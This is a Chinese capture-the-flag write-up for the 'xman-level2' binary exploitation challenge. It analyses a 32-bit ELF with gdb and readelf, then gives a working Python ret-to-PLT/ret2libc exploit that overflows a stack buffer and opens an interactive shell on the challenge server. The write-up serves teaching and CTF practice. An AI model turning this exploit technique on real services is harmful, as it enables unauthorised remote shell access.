## xman-level2

2019-5-16

### 分析

首先查看文件类型，Linux 32位程序

```shell
$ file level2.54931449c557d0551c4fc2a10f4778a1 
level2.54931449c557d0551c4fc2a10f4778a1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped

```

查看是否开了NX

```shell
$ readelf -e level2.54931449c557d0551c4fc2a10f4778a1 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10

```

属性为RW，栈不可执行

查看是否开启了PIE

```shell
$ readelf --headers level2.54931449c557d0551c4fc2a10f4778a1 
ELF 头：
 .....................
节头：
  .......................
程序头：
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
> LOAD           0x000000 0x08048000 0x08048000 0x00680 0x00680 R E 0x1000
  LOAD           0x000f08 0x08049f08 0x08049f08 0x00124 0x00128 RW  0x1000
  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000560 0x08048560 0x08048560 0x00034 0x00034 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1

 Section to Segment mapping:
  段节...
  ............................


```

看到LOAD的虚拟地址为0x08048000，不是0，意味着没开启PIE



gdb查看main函数，与第一题相比没有什么变化

```asm
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
   0x08048480 <+0>:	lea    ecx,[esp+0x4]
   0x08048484 <+4>:	and    esp,0xfffffff0
   0x08048487 <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804848a <+10>:	push   ebp
   0x0804848b <+11>:	mov    ebp,esp
   0x0804848d <+13>:	push   ecx
   0x0804848e <+14>:	sub    esp,0x4
   0x08048491 <+17>:	call   0x804844b <vulnerable_function>
   0x08048496 <+22>:	sub    esp,0xc
   0x08048499 <+25>:	push   0x804854c
   0x0804849e <+30>:	call   0x8048320 <system@plt>
   0x080484a3 <+35>:	add    esp,0x10
   0x080484a6 <+38>:	mov    eax,0x0
   0x080484ab <+43>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x080484ae <+46>:	leave  
   0x080484af <+47>:	lea    esp,[ecx-0x4]
   0x080484b2 <+50>:	ret    
End of assembler dump.

```

查看vulnerable_function函数，发现调用了system函数来打印字符串，然后调用read函数读取用户输入

```asm
(gdb) disass vulnerable_function 
Dump of assembler code for function vulnerable_function:
   0x0804844b <+0>:	push   ebp
   0x0804844c <+1>:	mov    ebp,esp
   0x0804844e <+3>:	sub    esp,0x88
   0x08048454 <+9>:	sub    esp,0xc
   0x08048457 <+12>:	push   0x8048540  //->"echo Input:"
   0x0804845c <+17>:	call   0x8048320 <system@plt>
   0x08048461 <+22>:	add    esp,0x10
   0x08048464 <+25>:	sub    esp,0x4
   0x08048467 <+28>:	push   0x100
   0x0804846c <+33>:	lea    eax,[ebp-0x88]
   0x08048472 <+39>:	push   eax
   0x08048473 <+40>:	push   0x0
   0x08048475 <+42>:	call   0x8048310 <read@plt>
   0x0804847a <+47>:	add    esp,0x10
   0x0804847d <+50>:	nop
   0x0804847e <+51>:	leave  
   0x0804847f <+52>:	ret    
End of assembler dump.
(gdb) x/s 0x8048540
0x8048540:	"echo Input:"
```

### 信息收集

这次开启了NX，栈上的数据不可执行。但是仍可通过覆盖ret地址来控制程序的执行。

尝试调用system函数来进行get shell

首先需要一个传递给system函数的字符串，也就是要执行的系统命令。

最好能直接执行/bin/sh，/bin/bash等shell命令解释器，而且最好程序自带这个字符串

strings命令搜索字符串

```
$ strings level2.54931449c557d0551c4fc2a10f4778a1  | grep sh
/bin/sh
.shstrtab
.gnu.hash
```

有一个`/bin/sh`字符串

一般来讲字符串为常量，存放在程序的.data段

首先因为没有开PIE，.data段的内存地址是固定的

```
$ readelf -S level2.54931449c557d0551c4fc2a10f4778a1 
There are 30 section headers, starting at offset 0x1860:

节头：
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  ........................
  [24] .data             PROGBITS        0804a01c 00101c 000010 00  WA  0   0  4
  [25] .bss              NOBITS          0804a02c 00102c 000004 00  WA  0   0  1
  ..........................

```

.data段的内存地址是0x804a01c，大小为10

用gdb搜索.data段，查找那个字符串的位置

使用find命令，不会用的话有帮助文档，方括号包裹的为可选项

```asm
(gdb) help find
Search memory for a sequence of bytes.
Usage:
find [/size-char] [/max-count] start-address, end-address, expr1 [, expr2 ...]
find [/size-char] [/max-count] start-address, +length, expr1 [, expr2 ...]
size-char is one of b,h,w,g for 8,16,32,64 bit values respectively,
and if not specified the size is taken from the type of the expression
in the current language.
Note that this means for example that in the case of C-like languages
a search for an untyped 0x42 will search for "(int) 0x42"
which is typically four bytes, and a search for a string "hello" will
include the trailing '\0'.  The null terminator can be removed from
searching by using casts, e.g.: {char[5]}"hello".

The address of the last match is stored as the value of "$_".
Convenience variable "$numfound" is set to the number of matches.

(gdb) b main
Breakpoint 1 at 0x804848e
(gdb) r
Starting program: /mnt/hgfs/workspace/ctf/jarvis/pwn/xman-level2/bin/level2.54931449c557d0551c4fc2a10f4778a1 

Breakpoint 1, 0x0804848e in main ()
(gdb) find 0x804a01c,+0x10,{char[2]}"sh"
0x804a029 <hint+5>
1 pattern found.
```

因为是hint+5，意思是hint变量+5的位置，从头查看这个变量，即`地址-5`，可以看到这个变量的全部内容为`/bin/sh`

```asm
(gdb) x/s 0x804a029-5
0x804a024 <hint>:	"/bin/sh"
```

对于系统命令的执行来讲，因为有环境变量的设置，所以传递绝对路径或相对路径都能执行/bin目录下的sh文件

拿到了字符串的位置，接下来获取system的地址

system函数为libc提供的函数，并不是程序自带的函数

为了让程序调用外部函数，有一套规则和结构，用来动态获取外部函数的地址。

在这道题里程序已经调用过system函数了，那么我们直接拿它调用的地址来用就好，暂不关心它是怎么获取外部函数的地址的

从vulnerable_function函数得知，system的地址是`0x8048320`

```c
0x0804849e <+30>:	call   0x8048320 <system@plt>
```



### 编写攻击程序

这里使用python

```python
from socket import *
import struct
import time

#####################################################
#exploit info
command_ptr = 0x804a024 #.data+0x8 : /bin/sh  the parameter of system(const char *cmd)
system_ptr = 0x8048320  #system()'s plt

payload = 'A' * 0x88
payload += "BBBB"
payload += struct.pack("<I", system_ptr) #"\x20\x83\x04\x08"
payload += "CCCC"
payload += struct.pack("<I", command_ptr) #"\x24\xa0\x04\x08"
#####################################################


#####################################################
#exploit
remote = "pwn2.jarvisoj.com"
port   = 9878

serverfd = socket()
serverfd.connect((remote, port))

time.sleep(0.5)
serverfd.recv(1024)

print "connected."
print "sendding payload..."
serverfd.send(payload + "\n")

time.sleep(1)
print "testng command 'pwd':"
serverfd.send("pwd\n")

time.sleep(1)
print serverfd.recv(1024)

print "switching into interactive shell..."

try:
    while True:
        command = str(raw_input(">> "))
        serverfd.send(command+"\n")
        print serverfd.recv(1024)
except KeyboardInterrupt:
    serverfd.close()
    exit(0)

#####################################################
```



### 总结

这道题并没有直接向栈上写shellcode来执行恶意命令，而是通过控制栈上的返回地址，进行函数的调用。

这种栈溢出技术叫做[**ROP（Return-oriented_programming）**](https://en.wikipedia.org/wiki/Return-oriented_programming)，即**返回指向编程**

这道题我们拿到的system函数地址实际上是plt上的地址，像这种返回到plt上的攻击技术叫做 `ret to plt`

当然又因为system是libc提供的函数，所以也可称为`ret to libc`



关于ROP技术，想了解更多的利用方法，可以查看以下的文章

基本ROP <https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/#ret2libc>

深入了解GOT,PLT和动态链接 <https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html>